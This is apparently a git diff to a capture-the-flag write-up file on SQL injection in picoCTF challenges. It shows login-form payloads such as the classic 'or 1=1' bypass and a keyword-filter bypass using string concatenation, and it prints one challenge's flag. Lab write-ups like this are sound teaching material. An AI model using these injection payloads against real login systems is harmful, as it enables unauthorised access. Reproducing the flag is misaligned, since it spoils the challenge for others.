@@ -1,4 +1,4 @@
-# SQL Injection Writeups
+![image](https://github.com/ShudarsanRegmi/ctf-writeups/assets/65646203/adb6d292-2342-4cc7-901b-434eab54a73d)# SQL Injection Writeups
 
 ## 1. More SQL; PicoCTF Easy Challenge
 
@@ -21,9 +21,23 @@ username=admin'+or+1=1--&password=asdf&debug=0
 ## 3. Irish Name Repo 1, Very simple SQli based challenge
 
 Just a simple payload in login form yielded
+
 ### Payloads
+
 ```http
 username=admin'+or+1=1--&password=admin&debug=1
 ```
 ![image](https://github.com/ShudarsanRegmi/ctf-writeups/assets/65646203/7ccc383c-b2c7-4f19-9852-1be5c332ee17)
 
+### 4. Web Gautlet 2
+It was a easy level sql injection challenge in picoCTF. The main challenge here was that the common payloads that are used for sql injections were being filtered out. Keywrods like admin,and special symbols like = < > ; or were getting filtered. So the challenge was to bypass this very simple filter implementation.
+Manged to get the flag with the payload below. 
+```
+user=ad'||'min&pass=a'+is+not+'b
+```
+![image](https://github.com/ShudarsanRegmi/ctf-writeups/assets/65646203/05a0c89f-65c5-44f2-96ae-63ec7dad2f4d)
+
+Finally got the flag in /filter.php
+```
+picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
+```
